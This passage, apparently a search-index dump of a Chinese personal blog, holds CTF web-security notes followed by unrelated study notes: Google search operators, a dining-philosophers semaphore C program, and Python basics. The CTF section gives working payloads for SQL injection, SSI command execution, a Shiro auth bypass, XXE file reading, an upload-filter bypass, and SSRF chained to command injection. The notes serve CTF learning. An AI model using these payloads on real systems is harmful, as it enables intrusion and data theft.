UNION SELECT * FROM admin WHERE 1 = 1-- SELECT * FROM admin WHERE email='a@e.com' UNION SELECT * FROM admin WHERE 1 = 1-- AND pwd='$pwd' 万能密码2型：admin' = ''-- 即 False=’’ 恒成立 SELECT * FROM admin WHERE email='a@e.com' = ''-- AND pwd='$pwd' 拼接 $sql = \"select \".$post['query'].\"||flag from Flag\"; // ||默认为或运算符，未使用预处理语句 mysqli_multi_query($conn, $sql); do{ if($res = mysqli_store_result($conn)){ // 获取查询结果 while($row = mysqli_fetch_row($res)){ // 逐行获取查询结果并打印 print_r($row); } } }while(@mysqli_next_result($conn)); // 支持多条SQL语句执行 查看数据表Flag所有列内容，且添加一个由列flag的值与1拼接/异或后生成的新列获取flag值，视不同sql而不同 # *,1 select *,1||flag from Flag; +----+------+-----------+ | id | x | 1 || x | +----+------+-----------+ | 1 | abc | 1||abc | | 2 | xyz | 1||xyz | +----+------+-----------+ 修改||为拼接，将返回1flag{xxx} # 1;set sql_mode=PIPES_AS_CONCAT;select 1 select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag; 预处理语句 $stmt = $conn-\u003eprepare(\"SELECT ? FROM Flag\"); $stmt-\u003ebind_param(\"s\", $post['query']); $stmt-\u003eexecute(); 联合注入 验证查询返回列 union select UNION SELECT 1, 2 # 报错: The used SELECT statements have a different number of columns UNION SELECT 1, 2, 3 # 一个一个试出原始查询语句返回列数, 成功则1,2,3将填入相应回显字段中 order by group by group by 3 order by 3 # 更改数字，表示以第几列进行排序 # 报错: Unknown column '3' in 'order clause' 则表示有2列字段数 基础信息 version() # 数据库版本信息 database() # 数据库名 爆破全部数据库 union select 1,2,group_concat(schema_name) from information_schema.schemata%23 查数据库中表 # 在第三个回显中显示数据库表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # # group_concat: 查询结果逗号连接成字符串 # table_name: 是系统数据库information_schema.tables中一个字段 # table_schema: 表所属数据库名称 # database(): 当前连接的数据库名称 对表查列字段 union select 1,2,group_concat(column_name)from information_schema.columns where table_name='leak_table_name' 对数据表爆数据 union select 1,2,group_concat(leak_column_name1, '-', leak_column_name2) from data_base_table_name # 或 from data_base_name.dtable_name 堆叠注入 利用 ; 在原SQL查询后追加新语句（有时需将前语句闭合） 测试 1; show databases; # 获取数据库 1; show tables; # 查看所有数据表 # 继续查看表x和表123中内容 show columns from x; show columns from `123 `; # 需使用反引号 替换：利用改名，将本不可读取的表数据修改为可读取表中数据 rename table t1 to t2; # 将t1表改名 alter table words add id int unsigned not Null auto_increment primary key; # 新表添加新列名:保持一致操作 alter table words change flag data varchar(100); # 改名flag为data 二次注入 漏洞点 mysql_query(\"insert into users(username, passwd, info) values ('{$username}', '{$password}', ' ');\") $info = query(\"select info from users where username='{$_SESSION['username']}';\"); // 显示info 1中无法回显，通过1中闭合union连接命令，在2中同样执行最终回显 报错注入 基于XPAT(XML)报错注入函数（xpath）：updatexml对xml文档数据查询及修改，extractvalue查询 若XPath_string不符合格式会以系统报错提示错误，查询字符串长度最大32位，需使用right(), left(), substr()截取字符串 获取用户名，数据库，版本 可以将其中user(), database(), version()等替换为select语句 # updatexml获取 1' or (updatexml(1, concat(0x7e, database(), 0x7e), 1)) # # extractvalue 从 XML 数据中提取值 xxx and (extractvalue(1, concat(0x7e, user(), 0x7e))); # 后续获取 # 表名 1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# # 字段名 1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('tabl","date":"2024-10-09","objectID":"/web_note/:4:9","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SSI注入漏洞 Server-Side Includes Injection，服务端包含注入，SSI赋予html静态页面动态效果 存在.shtml, .stm, .shtm网页上某部分变量可控，如下，通过远程命令注入动态回显 \u003cdiv\u003e{$what}\u003c/div\u003e \u003cp\u003e{{username}}\u003c/p\u003e \u003cdiv\u003e{%$a%}\u003c/div\u003e 利用命令格式 \u003c!--#exec cmd=\"command\"--\u003e ","date":"2024-10-09","objectID":"/web_note/:4:10","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"JAVA ","date":"2024-10-09","objectID":"/web_note/:5:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Shiro漏洞 身份验证绕过 Apache Shiro \u003c 1.5.3 Shiro 特征：响应数据包中Set-Cookie: rememberMe=deleteMe; 直接访问 /shiro/admin/page 返回302跳转要求登录 访问 /;/shiro/admin/page 能绕过Shiro权限验证访问到/admin路由信息 ","date":"2024-10-09","objectID":"/web_note/:5:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"文件泄露 存在文件下载 tomcat敏感文件 /WEB-INF/web.xml：Web配置文件，servlet及其他应用组件配置、命名规则 /WEB-INF/classes/：包含所有 Servlet 类及其他类文件 /WEB-INF/lib/：存放 web 应用所需各种 JAR 文件 /WEB-INF/src/：源码目录 /WEB-INF/database.properties：数据库配置文件 web.xml查看 \u003cservlet\u003e \u003cservlet-name\u003eFlagController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.FlagController\u003c/servlet-class\u003e \u003c/servlet\u003e 读取对应文件：WEB-INF/classes/com/wm/ctf/FlagController.class ","date":"2024-10-09","objectID":"/web_note/:5:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SQL注入 漏洞点：字符串拼接 if (!StringUtils.isNullOrEmpty(userName)) { sql.append(\" and u.userName like '%\").append(userName).append(\"%'\");// 模糊查询: % 匹配任意长度的字符 } 前后闭合 // %25 为 %, 此处需要用%25, % 会报错 name%25' union select 1,2,version(),4,5,6,database(),8,9,10,11,12,13,14 where '1' like '%251 // 大于14不返回结果可判断回显列数 PrepareStatement JAVA SQL API中用于执行参数化查询的接口，可防止SQL注入，SQL语句提前编译，参数作为数据处理而非直接拼接 // 查询公共类 public static ResultSet execute(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet, String sql, Object[] params) throws SQLException { // 获取预编译的SQL语句 preparedStatement = connection.prepareStatement(sql); // 将占位符 ? 赋值 for (int i = 0; i \u003c params.length; i++) { preparedStatement.setObject(i + 1, params[i]); } // 执行查询 resultSet = preparedStatement.executeQuery(); return resultSet; } 使用 String sql = \"SELECT * FROM users WHERE username = ? AND age = ?\"; Object[] params = { \"Alice\", 25 }; ResultSet resultSet = execute(connection, null, null, sql, params); ","date":"2024-10-09","objectID":"/web_note/:5:3","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"反序列化漏洞 ","date":"2024-10-09","objectID":"/web_note/:5:4","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"JS ","date":"2024-10-09","objectID":"/web_note/:6:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"文件上传 前端js过滤绕过 var file = document.getElementsByName('upload_file')[0].value; var allow_ext = \".jpg|.png|.gif\"; var ext_name = file.substring(file.lastIndexOf(\".\")); // 上传文件类型 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = \"NO\"; alert(errMsg); return false; } 一句话木马命名后缀为jpg，后借助burpsuite拦截请求将名称改回 ","date":"2024-10-09","objectID":"/web_note/:6:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"XXE注入漏洞 XML用于数据传输 XML \u003c!-- 一般实体 --\u003e \u003c!ENTITY name \"content\"\u003e \u003c!-- 声明 --\u003e \u0026name \u003c!-- 引用 --\u003e \u003c!-- 参数实体 --\u003e \u003c!ENTITY % name \"content\"\u003e \u003c!-- 声明 --\u003e \u0026name \u003c!-- 引用 --\u003e \u003c!-- 内部实体 --\u003e \u003c!DOCTYPE test [\u003c!ENTITY f \"upfine\"\u003e]\u003e \u003c!-- 声明 --\u003e \u0026f \u003c!-- 引用 --\u003e \u003c!-- 外部实体 --\u003e \u003c!DOCTYPE test [\u003c!ENTITY f SYSTEM \"file:///flag\"\u003e]\u003e \u003c!-- 声明 --\u003e \u0026f \u003c!-- 引用 --\u003e DTD：用于XML文档格式规范，可内部外部引入\u003c!DOCTYPE ... 外部实体支持协议：php(file, php, http, ftp), java(http, ftp, https) XML外部实体注入，XML External Entity Injection，解析XML输入未禁止外部实体加载 抓包POST数据以XML形式传输 \u003cuser\u003e\u003cusername\u003einput_thing\u003c/username\u003e\u003c/user\u003e 注入 声明XML文档版本及编码，可选 \u003c?xml version=\"1.0\" encoding = \"utf-8\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY file SYSTEM \"file:///flag\"\u003e ]\u003e \u003cuser\u003e \u003cusername\u003e\u0026file;\u003c/username\u003e \u003c/user\u003e 使用协议获取源码 \u003c!ENTITY file SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/xxx.php\"\u003e \u003c!-- 获取内容base64解码 --\u003e 探测内网 可通过/proc/net/fib_trie, /proc/net/arp, /etc/hosts获取可疑内网IP \u003c!ENTITY file SYSTEM \"http://x.x.x.x/\"\u003e \u003c!-- 通过此访问内网主机数据 --\u003e ","date":"2024-10-09","objectID":"/web_note/:6:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"Node.js ","date":"2024-10-09","objectID":"/web_note/:7:0","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"基础知识 ","date":"2024-10-09","objectID":"/web_note/:7:1","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes","CTF"],"content":"SSRF漏洞 漏洞点 设置服务器端口 var port = normalizePort(process.env.PORT || '3000'); 此处通过post传入payload再通过get本地服务器访问达成SSRF利用 // routes/index.js var blacklist=['::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1']; // req中ip:客户端IP地址, url:请求URL, query:GET查询参数, body:POST请求体数据 router.get('/debug', function(req, res, next) { // 请求对象, 响应对象, 下一步中间件 if(blacklist.indexOf(req.ip)!=-1){ // 黑名单过滤 var u=req.query.url.replace(/[\\\"\\']/ig,''); // 清除请求url的单双引号 let log=`echo '${url.parse(u).href}'\u003e\u003e/tmp/log`; child_process.exec(log); // 执行命令 res.json({data:fs.readFileSync('/tmp/log').toString()}); // 读取内容返回 }else{ res.json({}); } }); router.post('/debug', function(req, res, next) { if(req.body.url !== undefined) { var u = req.body.url; var urlObject=url.parse(u); // 解析返回json对象 if(blacklist.indexOf(urlObject.hostname) == -1){ var dest=urlObject.href; request(dest,(err,result,body)=\u003e{ res.json(body); }) } else{ res.json([]); } } }); 构造payload 进制转换绕过黑名单 闭合引号加入其余命令：利用nodejs的url库二次解码绕过 @字符前，即表示用户名密码字段，会被二次解码 %00或%23截断后续代码 # 二次编码 =\u003e web服务器一次解码 http://a%27@a, nodejs二次解码 http://a'@a {\"url\":\"http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00\"} # 特殊编码 =\u003e %EF%BC%87解码为' {\"url\":\"http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00\"} 使用POSTMAN，POST -\u003e body -\u003e x-www-form-urlencoded 绕过 SSRF黑名单绕过 http://localhost http://[::]:80/ 进制转换http://0177.0.0.1/或http://2130706433/ ","date":"2024-10-09","objectID":"/web_note/:7:2","tags":["web"],"title":"WEB","uri":"/web_note/"},{"categories":["Notes"],"content":"Google intitle:xxxx：限定标题 allintitle:xxx：限定标题多个关键词 intext:xxx：限定内容关键词 inurl:xxx：限定网址关键词 site:xxx.com：限定网址来源 imagesize:2560x1440：限定图片尺寸 filetype:ppt：限定文件格式 ","date":"2024-10-09","objectID":"/search/:1:0","tags":["ability"],"title":"搜索","uri":"/search/"},{"categories":["杂记"],"content":"问题分析 使用信号量机制解决，会出现产生死锁的情况，所以需要解决死锁，有一种方法为至多只允许四位哲学家同时去拿左边的筷子，最终能保证至少有一位哲学家能够进餐，并在用毕时能释放用过的两只筷子 do{ wait(chopstick[i]); wait(chopstick[(i+1)%5]); eat; signal(chopstick[i]); signal(chopstick[(i+1)%5]); think; }while(TRUE); ","date":"2022-11-18","objectID":"/pv/:1:0","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"伪代码 semaphore chopstick[5] = {1, 1, 1, 1, 1}; semphore room=4; Pi (){ while(1){ P(room);//只能有四个人进入拿左边的筷子 P(chopstick[i]); //先拿左筷子 P(chopstick[(i+1)%5]);//再拿右筷子 进餐; V(chopstick[(i+1)%5]; V(chopstick[i]); V(room); 思考 } } ","date":"2022-11-18","objectID":"/pv/:2:0","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"分析及知识点 ","date":"2022-11-18","objectID":"/pv/:3:0","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"sembuf结构体 struct sembuf { unsigned short int sem_num; //信号量集中的第几个信号量(0~nsems-1,0:第一个,nsems-1:最后一个) short int sem_op; //对信号量的操作，\u003e0:挂起操作, 0, \u003c0 short int sem_flg; //操作标识：0， IPC_WAIT, SEM_UNDO }; sem_op标识对信号量的所进行的操作类型。对信号量的操作有三种类型： sem_op \u003e 0，对该信号量执行挂出操作，挂出的值由sem_op决定，系统会把sem_op的值加到该信号量的当前值semval上。如果sem_flag指定了SEM_UNDO（还原）标志，那么相应信号量的semadj值会减掉sem_op的值。 sem_op \u003c 0，对该信号量执行等待操作，当信号量的当前值semval \u003e= -sem_op时，semval减掉sem_op的绝对值，为该线程分配对应数目的资源。如果指定SEM_UNDO，相应信号量的semadj就加上sem_op的绝对值。当semval \u003c -sem_op时，相应信号量的semncnt就加1，调用线程被阻塞，直到semval \u003e= -sem_op，当此条件满足时，调用线程被唤醒，执行相应的分配操作，然后semncnt减去1. sem_op = 0，表示调用者希望semval变为0。如果为0则立即返回，如果不为0，相应信号量的semzcnt加1，调用调用线程被阻塞。 sem_flg：信号量操作的属性标志。①如果为0，表示正常操作；②如果为IPC_WAIT，使对信号量的操作是非阻塞的，即指定了该标志，调用线程在信号量的值不满足条件的情况下不会被阻塞，而是直接返回-1，并将errno设置为EAGAIN；③如果为SEM_UNDO，那么将维护进程对信号量的调整值，以便进程结束时恢复信号量的状态。 semadj：指定信号量针对某个特定进程的调整值。只有sembuf结构的sem_flag指定为SEM_UNDO后，semadj才会随着sem_op而更新。 semncnt：等待semval变为大于当前值的线程数。 semzcnt：等待semval变为0的线程数。 ","date":"2022-11-18","objectID":"/pv/:3:1","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"semop函数 在 Linux 下，PV 操作通过调用semop函数来实现，用于请求和释放信号量，改变信号量的值。当请求的信号量值 \u003e 0 时，semop 直接返回，否则会阻塞，直到信号量值大于 0。如果是释放（归还）资源，semop 直接返回。 该函数定义在头文件 sys/sem.h中，原型如下： int semop(int semid, struct sembuf *sops, size_t nsops);成功返回0，失败返回-1 semid 为信号量集的标识符 参数 sops 指向进行操作的结构体数组的首地址 参数 nsops 指出将要进行操作的信号的个数 ","date":"2022-11-18","objectID":"/pv/:3:2","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"semget函数 是用来创建或获取信号量的ipc内核对象，同时返回id号，函数原型： int semget(key_t key, int nsems, int semflg); key：整数值（唯一非零），用户可自己设定 键值是IPC_PRIVATE，该值通常为0，意思就是创建一个仅能被进程访问的信号量。 键值不是IPC_PRIVATE，我们可以指定键值。 不相关的进程可以通过它访问一个信号量，它代表程序可能要使用的某个资源，程序对所有信号量的访问都是间接的，程序先通过调用semget()函数并提供一个键，再由系统生成一个相应的信号标识符（semget()函数的返回值），只有semget()函数才直接使用信号量键，所有其他的信号量函数使用由semget()函数返回的信号量标识符。如果多个程序使用相同的key值，key将负责协调工作。 num_sems：指定需要的信号量数目，它的值几乎总是1。 sem_flags：是一组标志，IPC_CREAT如果信号量不存在，则创建一个信号量，否则获取；IPC_EXCL只有信号量不存在的时候，新的信号量才建立，否则就产生错误。0660代表读写权限等 返回值：semget()函数成功返回一个相应信号标识符（非零），失败返回-1 ","date":"2022-11-18","objectID":"/pv/:3:3","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"semctl函数 设置、获取、控制信号量值，原型为： int semctl(int sem_id, int sem_num, int command, ...); 若有第四个参数一般为： union semun { int val; struct semid_ds *buf; unsigned short *arry; }; command通常是下面两个值中的其中一个 SETVAL：用来把信号量初始化为一个已知的值。p 这个值通过union semun中的val成员设置，其作用是在信号量第一次使用前对它进行设置。 IPC_RMID：用于删除一个已经无需继续使用的信号量标识符。 ","date":"2022-11-18","objectID":"/pv/:3:4","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":["杂记"],"content":"代码 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003ctime.h\u003e #include \u003csys/ipc.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/sem.h\u003e #include \u003csys/types.h\u003e #define MAX_BUFFER_SIZE 5 #define SHM_MODE 0600 #define SEM_MODE 0600 #define mutex 5 #define true 1 #define room 6 int chopstick[5] = {0,1,2,3,4}; int sem_id = -1; pid_t philosopher; //P操作 void Wait(int sem_id,int sem_num) { struct sembuf buf; buf.sem_num = sem_num;//第几个信号量 buf.sem_op = -1;//对该信号量执行等待 buf.sem_flg = SEM_UNDO;//维护进程对信号量的调整值 if(semop(sem_id,\u0026buf,1) \u003c 0) { perror(\"wait failed\"); exit(1); } } //V操作 void Signal(int sem_id,int sem_num) { struct sembuf buf; buf.sem_num = sem_num; buf.sem_op = 1;//对该信号量执行挂出 buf.sem_flg = SEM_UNDO; if(semop(sem_id,\u0026buf,1) \u003c 0) { perror(\"signal failed\"); exit(1); } } void think(int i) { printf(\"the philosopher of %d is thinking(pid is %d)\\n\",i,getpid()); } void eat(int i) { printf(\"the philosopher of %d is eating(pid is %d)\\n\",i,getpid()); } void Philosophers1(int sem_id,int i) { int j; for(j=0;j\u003c2;j++){ think(i); Wait(sem_id,room); Wait(sem_id,chopstick[i]); Wait(sem_id,chopstick[(i+1)%5]); eat(i); Signal(sem_id,chopstick[i]); Signal(sem_id,chopstick[(i+1)%5]); printf(\"the process of %d(pid is %d,ppid is %d)has finished eating\\n\",i,getpid(),getppid()); Signal(sem_id,room); fflush(stdout); } exit(0); } int main() { int i = 0; if((sem_id = semget(IPC_PRIVATE,7,SEM_MODE)) \u003c 0) { perror(\"create semaphore failed! \\n\"); exit(1); } if(semctl(sem_id,mutex,SETVAL,1) == -1) { perror(\"sem set value error! \\n\"); exit(1); } for(i=0;i\u003c5;i++){ if(semctl(sem_id,chopstick[i],SETVAL,1) == -1) { perror(\"sem set value error! \\n\"); exit(1); } } if(semctl(sem_id,room,SETVAL,4) == -1) { perror(\"sem set value error! \\n\"); exit(1); } for(i=0;i\u003c5;i++){ philosopher = fork(); if(philosopher \u003c 0){ perror(\"the fork failed\"); exit(1); } else if(philosopher == 0){ Philosophers1(sem_id,i); } } while (wait(0) != -1); shmctl(sem_id,IPC_RMID,0); printf(\"finish!!!\\n\"); fflush(stdout);//在prinf()后加上fflush(stdout); 强制马上输出，避免错误。 exit(0); return 0; } 结果显示： [j@master test]$ ./test the philosopher 1 is thinking(pid is 5185) the philosopher 1 is eating(pid is 5185) the process of 1(pid is 5185,ppid is 5183)has finished eating the philosopher 1 is thinking(pid is 5185) the philosopher 1 is eating(pid is 5185) the process of 1(pid is 5185,ppid is 5183)has finished eating the philosopher 2 is thinking(pid is 5186) the philosopher 2 is eating(pid is 5186) the process of 2(pid is 5186,ppid is 5183)has finished eating the philosopher 2 is thinking(pid is 5186) the philosopher 2 is eating(pid is 5186) the process of 2(pid is 5186,ppid is 5183)has finished eating the philosopher 3 is thinking(pid is 5187) the philosopher 3 is eating(pid is 5187) the process of 3(pid is 5187,ppid is 5183)has finished eating the philosopher 3 is thinking(pid is 5187) the philosopher 3 is eating(pid is 5187) the process of 3(pid is 5187,ppid is 5183)has finished eating the philosopher 4 is thinking(pid is 5188) the philosopher 4 is eating(pid is 5188) the process of 4(pid is 5188,ppid is 5183)has finished eating the philosopher 4 is thinking(pid is 5188) the philosopher 4 is eating(pid is 5188) the process of 4(pid is 5188,ppid is 5183)has finished eating the philosopher 0 is thinking(pid is 5184) the philosopher 0 is eating(pid is 5184) the process of 0(pid is 5184,ppid is 5183)has finished eating the philosopher 0 is thinking(pid is 5184) the philosopher 0 is eating(pid is 5184) the process of 0(pid is 5184,ppid is 5183)has finished eating end ","date":"2022-11-18","objectID":"/pv/:4:0","tags":["code analysis"],"title":"哲学家进餐问题","uri":"/pv/"},{"categories":null,"content":"关于我 tags： Breaking / 绘画 / wata艺 / 学习 / 乒乓球 / 电影 / 单机 目前在读研ing… 对未来依旧迷茫 该博客将记录一些平时记载的笔记 ","date":"2022-09-14","objectID":"/about/:1:0","tags":null,"title":"个人介绍","uri":"/about/"},{"categories":["Notes","Language"],"content":"环境 ","date":"2022-07-25","objectID":"/python/:1:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"pip 手动安装包 python3 setup.py install pip 安装 pip list #列出当前已安装的所有模块 pip install --upgrade xxx # 升级xxx模块 pip uninstall xxx # 卸载xxx模块 pip install xxx.whl # 使用whl文件直接安装xxx ","date":"2022-07-25","objectID":"/python/:1:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"基本操作 查看版本 \u003e\u003e\u003e sys.version '3.10.2 (tags/v3.10.2:a58ebcc, Jan 17 2022, 14:12:15) [MSC v.1929 64 bit (AMD64)]' \u003e\u003e\u003e sys.version_info sys.version_info(major=3, minor=10, micro=2, releaselevel='final', serial=0) 帮助方法 import module dir(module) # 查看模块中可用对象 dir(__builtins__) help(module.func) # 查看使用方法 globals()：当前作用域内所有全局变量和值的字典 locals()：当前作用域内所有局部变量和值的字典 变量名区分大小写 x = 3 y = x # 允许多个变量指向同一个值 z = 3 id(x) == id(y) == id(z) # True 123 123 123 x += 6 # 其中一个变量修改后，其内存地址变化，但不影响另一个变量 # 修改变量指向的内存地址，先取出x的值，加6，将结果存放于新的内存中，将x指向该新内存空间 id(x) == id(y) # False 135 123 关键字： \u003e\u003e\u003e import keyword \u003e\u003e\u003e keyword.kwlist ['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'] 输出 print('xxx', file = fp, end = ' ') # 重定向到文件中, 输出内容不换行 ","date":"2022-07-25","objectID":"/python/:2:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"函数方法 id()：返回对象的唯一标识符（内存地址），整数 input()：输入操作，x = input(\"请输入：\") eval()：将字符串作为表达式进行求值并返回结果，eval(expression, globals=None, locals=None) ord()：对应字符的 ASCII 或者 Unicode 数值，ord('a') chr()：当前整数对应的 ASCII 字符，chr(0x30) filter()：返回序列中使函数值为 True 的元素 res = filter(function or None, sequence) print(list(res)) reduce()：对序列元素累积计算 n = [1,2,3,4] print(reduce(lambda a, b: a + b, nums)) # 10 reversed()：返回逆序后的列表或元组 round()：四舍五入，保留小数点后 2 位，round(x, 2) ","date":"2022-07-25","objectID":"/python/:2:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"方法例子 快速搭建一个 web 服务 python -m http.server 80 ","date":"2022-07-25","objectID":"/python/:2:2","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"库 math math.sqrt()：返回平方根 datetime Today = datetime.date.today() # 今天 Today.timetuple().tm_yday # 今天是今年的第几天 Today.replace(year=2023) # 替换日期中的年 now = datetime.datetime.now() # 现在 now + datetime.timedelta(days=5) # 5天后的日期时间 random x = [random.randint(0,100) for i in range(1000)] # 随机取1000个在(0,100)范围内的整型数 random.shuffle(xlist) # 打乱顺序 随机字符串 import string import random x = string.ascii_letters + string.digits + string.punctuation # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%\u0026\\'()*+,-./:;\u003c=\u003e?@[\\\\]^_`{|}~' y = [random.choice(x) for i in range(1000)] collections 计数 # 使用defaultdict类 frequences = defaultdict(int) for item in z: frequences[item] += 1 frequences.items() # 使用Counter类 frequences = Counter(z) frequences.items() frequences.most_common(1) ","date":"2022-07-25","objectID":"/python/:2:3","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"类型 ","date":"2022-07-25","objectID":"/python/:3:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"数字 复数 x + yj # j表示虚部 a.real # 实部 a.imag # 虚部 a.conjugate() # 共轭复数 进制 十六进制：0x 开头 八进制：0o 开头 二进制：0b 开头 浮点数 print(f\"{x:.2f}\") # x 小数点后2位 ","date":"2022-07-25","objectID":"/python/:3:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"元组 元组（tuple）为不可变序列类型，一旦创建后其内容就不能被修改，元组访问处理速度比列表更快 \u003e\u003e\u003e t = (1, 2, 3) \u003e\u003e\u003e del t # del删除元组本身而不是其中元素，del删除了变量t的引用，释放了元组占用的内存 \u003e\u003e\u003e a = 3, # 单个元素时需要加入逗号 \u003e\u003e\u003e a (3,) tuple() # 将序列转换为元组 ","date":"2022-07-25","objectID":"/python/:3:2","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"矩阵 矩阵转置 # 列表推导式 matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]] [[row[i] for row in matrix] for i in range(4)] \u003e\u003e\u003e [[1,5,9],[2,6,10],[3,7,11],[4,8,12]] # zip, list实现 list(zip(*matrix)) ","date":"2022-07-25","objectID":"/python/:3:3","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"字典 创建 dict(zip(keys, values)) # keys和values都是列表 dict(key1=value1, key2=value2) dict.fromkeys(['xx','xx','xx']) # 给定键，创建内容为None的字典 获取指定键的值 dict.get(key, default=None) # key:要查找的键 # default:如果指定键的值不存在，返回该默认值 获取列表 dict.items() # \"键-值对\"列表 dict.keys() # 键列表 dict.values() # 值列表 s = {'a':1, 'b':2, 'c':3} d, e, f = s.items() # d: ('a', 1) d, e, f = s # d: 'a' d, e, f = s.values() # d: 1 更新 将字典 2 的键值对添加到当前字典对象，若存在相同键，以字典 2 值为准进行更新 Dict1.update({'a':'a','b':'b'}) 有序字典 import collections x = collections.OrderedDict() ","date":"2022-07-25","objectID":"/python/:3:4","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"列表 删除列表元素时，自动对列表内存进行收缩，移动列表元素以保证所有元素之间没有空隙，元素索引都发生改变 创建 list((1,2,3)) list(range(1,10,2)) list('xxx') # ['x','x','x'] 计数 list = ['a','b','c','a'] list.count('a') # 2 切片 a[i:j:step] # 从下标i到j-1, 每step提取一个 切片返回的是列表元素的浅复制，其中一个改变另一个不改变 与列表对象的直接赋值不一样，直接赋值时两个列表指向同一块内存，其中一个改变另一个也改变 添加 list.append(x) 删除 list.remove(x) # 删除首次出现的指定元素 del x[i] 排序 alist.sort(key=None, reverse=False) # key: 用于排序的关键字 reverse=True为逆序 alist.sort(key=lambda x:len(str(x)) # 自定义排序 返回新列表，不对原列表进行修改 sorted(persons, key=lambda x:(x['name'], -x['age'])) # 按姓名升序，年龄降序 from operator import itemgetter sorted(phonebook.items(), key=itemgetter(1)) #按字典中元素值排序 常用功能 list.extend(L) # 将列表L中所有元素添加到列表尾部 list.insert(index, x) # 在列表指定位置index处添加元素x list.pop([index]) # 删除并返回列表对象指定位置的元素，默认为最后一个元素 list.clear() # 清空 list.index(x) # 返回第一个值为x的元素的下标 list.reverse() # 原地翻转 list.copy() # 返回列表对象的浅复制 使用*乘法创建的是已有对象的引用，一旦更改，相应引用也更改 \u003e\u003e\u003e x = [[None] * 2] * 3 \u003e\u003e\u003e x [[None, None], [None, None], [None, None]] \u003e\u003e\u003e x[0][0] = 5 \u003e\u003e\u003e x [[5, None], [5, None], [5, None]] 成员资格判断 x in list # True or False 列表推导式 new_list = [expression for item in iterable if condition] # expression:计算新列表中的每个元素的值 # item:可迭代对象中的每一个元素 # iterable:可迭代对象 # condition:条件过滤列表中对象 a = [1, 2, 3, 4, 5] b = [x * x for x in a if x % 2 == 0] print(b) # 输出 [4, 16] 列表转字典 a = ['a','b','c'] b = ['ab','bc','ca'] dict(zip(a,b)) # {'a': 'ab', 'b': 'bc', 'c': 'ca'} 内置函数 cmp(序列1,序列2) # \u003e返回1，\u003c返回-1，=返回0 alist = [1,2,3] blist = [4,5,6] clist = zip(a, b) list(clist) # [(1,4),(2,5),(3,6)] for idx, value in enumerate(alist): print(idx, value) ","date":"2022-07-25","objectID":"/python/:3:5","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"集合 无序可变序列，同一集合的元素之间不允许重复 a = {3,5} a.add(7) # {3,5,7} a.pop() # 3 a.remove(7) # {5} a.clear() # {} a_set = set([1,2,3]) 运算 # 并集 a | b a.union(b) # 交集 a \u0026 b a.intersection(b) # 差集 a-b 